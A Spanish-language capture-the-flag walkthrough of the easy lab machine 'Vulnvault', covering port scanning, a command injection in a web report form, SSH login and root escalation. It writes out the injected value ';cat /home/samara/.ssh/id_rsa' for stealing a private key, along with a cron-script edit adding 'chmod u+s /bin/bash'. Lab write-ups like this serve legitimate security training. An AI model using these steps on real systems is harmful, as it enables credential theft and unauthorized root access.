---
description: '✍️ Autor: d1se0🔍 Dificultad: Fácil  📅 Fecha de creación: 25/08/2024'
---

# Vulnvault

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo, el puerto **22** perteneciente al servicio **SSH** y el puerto **80** perteneciente al servicio **HTTP** están abiertos, por lo que se procederá a indagar más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 172.17.0.2
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora exploramos el servicio **HTTP**. Se ingresó la dirección IP en el navegador, lo que llevó a que la página web sobre un centro de operaciones.

<figure><img src="../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

Parece ser que la página está diseñada principalmente para la generación de reportes y la subida de archivos. Sin embargo, tras explorarla un poco más y hacer algunas pruebas, descubrí algo más interesante que podría ser útil ya que con la subida de archivos no tuvo éxito.

<figure><img src="../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Dado que hemos logrado la capacidad de ejecutar comandos de forma remota, el siguiente paso será leer el contenido del archivo `/etc/passwd` para identificar los usuarios presentes en el sistema. Para ello, simplemente ejecutamos el siguiente comando.

<figure><img src="../../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>

Observamos que existe un usuario llamado **samara** en el sistema. Con esta información, podemos intentar acceder a la clave privada de SSH del usuario. Para ello, podríamos ejecutar el siguiente comando.

```
;cat /home/samara/.ssh/id_rsa
```

<figure><img src="../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

Una vez que hemos obtenido la clave privada de SSH, la copiamos en un archivo en nuestra máquina local, nombrándolo `id_rsa`. A continuación, le asignamos los permisos adecuados con el siguiente comando:

```bash
chmod 600 id_rsa
```

Con los permisos establecidos, nos conectamos al servidor mediante SSH utilizando la clave privada, ejecutando el siguiente comando:

```bash
ssh -i id_rsa samara@172.17.0.2
```

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root.**&#x20;

Ahora que estamos dentro como el usuario "samara", encontramos un mensaje de root, pero no contiene nada relevante. Tras investigar un poco más, se me ocurre usar `pspy` para monitorear procesos en busca de alguna actividad oculta. Para ello, seguimos estos pasos:

1. Descargamos `pspy` en la máquina objetivo utilizando `wget`.
2.  Asignamos los permisos de ejecución con:

    ```bash
    chmod +x pspy64
    ```
3.  Finalmente, ejecutamos `pspy` con el siguiente comando:

    ```bash
    ./pspy64
    ```

Observamos que un script llamado `echo.sh` se ejecuta periódicamente con privilegios de root:

```bash
2024/08/26 23:31:32 CMD: UID=0     PID=626434 | /bin/bash /usr/local/bin/echo.sh
```

Para aprovechar esto, editamos el script utilizando `nano` y añadimos la siguiente línea al final:

```bash
chmod u+s /bin/bash
```

Guardamos los cambios con `Ctrl+O`, presionamos `Enter`, y salimos del editor con `Ctrl+X`. Ahora, solo necesitamos ejecutar el siguiente comando para obtener privilegios de root.

```bash
bash -p
```

Y así, ya somos **root**.
